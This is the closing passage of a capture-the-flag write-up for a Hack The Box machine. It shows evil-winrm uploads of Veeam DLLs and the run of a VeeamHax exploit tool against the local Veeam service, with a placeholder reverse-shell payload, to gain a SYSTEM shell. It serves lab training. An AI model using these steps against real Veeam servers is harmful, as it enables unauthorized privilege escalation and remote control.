+Uploading /home/kali/htb/jobtwo/Veeam.Backup.Interaction.MountService.dll: 448kB [00:00, 578kB/s]                                                                                                                    
+[+] File uploaded successfully as: C:\exploit\Veeam.Backup.Interaction.MountService.dll
+evil-winrm-py PS C:\exploit&gt; upload Veeam.Backup.Model.dll .
+Uploading /home/kali/htb/jobtwo/Veeam.Backup.Model.dll: 4.25MB [00:08, 539kB/s]                                                                                                                                      
+[+] File uploaded successfully as: C:\exploit\Veeam.Backup.Model.dll
+evil-winrm-py PS C:\exploit&gt;</code></pre><p>Ill upload all 4 files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\exploit&gt; .\VeeamHax.exe --cmd &#39;&lt;base64 encoded reverse shell&gt;&#39;
+Targeting 127.0.0.1:9401</code></pre><p>Ill use revshells to get a powershell reverse shell then drop it in the command and run it</p><p><img src="images/jobtwo/pasted-image-20261102184441.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a shell as this SYSTEM</p><p><img src="images/jobtwo/pasted-image-20261102184813.webp" alt="Screenshot" loading="lazy" /></p><p>I can then get the root flag</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-certificate/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Certificate</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-checkpoint/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Checkpoint</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
